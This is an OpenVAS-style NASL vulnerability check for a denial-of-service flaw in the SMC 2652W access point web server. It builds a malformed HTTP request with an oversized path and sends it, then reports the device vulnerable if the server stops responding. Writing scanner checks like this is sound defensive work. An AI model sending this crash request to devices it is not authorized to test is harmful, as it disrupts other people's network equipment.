# SPDX-FileCopyrightText: 2002 John Lampe
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11141");
  script_version("2025-01-31T05:37:27+0000");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("SMC 2652W Access Point DoS Vulnerability (Nov 2005)");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2002 John Lampe");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Contact the vendor for a fix.");

  script_tag(name:"summary", value:"The remote SMC 2652W Access point web server crashes when sent a
  specially formatted HTTP request.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

# found with SPIKE 2.7 http://www.immunitysec.com/spike.html
# req string directly horked from SPIKE API

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

host = http_host_name(port:port);

if(http_is_dead(port:port))
  exit(0);

req = string("GET /", crap(240), ".html?OpenElement&FieldElemFormat=gif HTTP/1.1\r\n");
req = string(req, "Referer: http://localhost/bob\r\n");
req = string(req, "Content-Type: application/x-www-form-urlencoded\r\n");
req = string(req, "Connection: Keep-Alive\r\n");
req = string(req, "Cookie: VARIABLE=FOOBAR; path=/\r\n");
req = string(req, "User-Agent: ", http_get_user_agent(), "\r\n");
req = string(req, "Variable: result\r\n");
req = string(req, "Host: ", host, "\r\nContent-length: 13\r\n");
req = string(req, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n");
req = string(req, "Accept-Encoding: gzip\r\nAccept-Language:en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n");

http_send_recv(port:port, data:req);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
